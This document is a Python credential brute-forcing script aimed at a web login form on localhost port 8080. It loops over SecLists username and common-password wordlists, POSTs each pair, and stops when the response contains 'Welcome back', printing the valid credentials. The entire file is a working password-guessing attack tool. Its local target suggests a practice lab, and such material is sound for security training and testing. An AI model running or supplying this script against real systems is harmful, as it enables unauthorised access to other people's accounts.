import requests
import sys

# Define the target URL where the login form is hosted
target = "http://127.0.0.1:8080"

# List of usernames to attempt
# /usr/share/seclists/Usernames/top-usernames-shortlist.txt

usernames_path = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
usernames = []

with open(usernames_path, "r") as file:
    usernames = [line.strip("\n") for line in file]

    # Path to the file containing potential passwords
    passwords = (
        "/usr/share/wordlists/seclists/Passwords/2020-200_most_used_passwords.txt"
    )

    # Text that indicates a successful login on the web page
    needle = "Welcome back"

    # Iterate over each username in the list
    for username in usernames:
        # Open the password file and iterate over each password
        with open(passwords, "r") as passwords_list:
            for password in passwords_list:
                # Remove the newline character and encode the password for HTTP transmission
                password = password.strip("\n").encode()
                # Print the current attempt; using carriage return to overwrite the previous attempt
                sys.stdout.write(
                    "[X] Attempting user:pass -> {}:{}\r".format(
                        username, password.decode()
                    )
                )
                sys.stdout.flush()  # Ensure that the stdout buffer is flushed immediately

                # Send the POST request with username and password as form data
                r = requests.post(
                    target, data={"username": username, "password": password}
                )

                # Check if the response contains the text indicative of a successful login
                if needle.encode() in r.content:
                    # Success: valid credentials found, output result and exit
                    sys.stdout.write(
                        "\n\t[>>>] Valid password '{}' found for user '{}'!".format(
                            password.decode(), username
                        )
                    )
                    sys.exit()  # Terminate the script after finding valid credentials

            # If the loop completes without finding a valid password, print this outcome
            sys.stdout.flush()
            sys.stdout.write("\nNo valid password found for '{}'".format(username))
            sys.stdout.write("\n")  # Move to a new line after testing each username
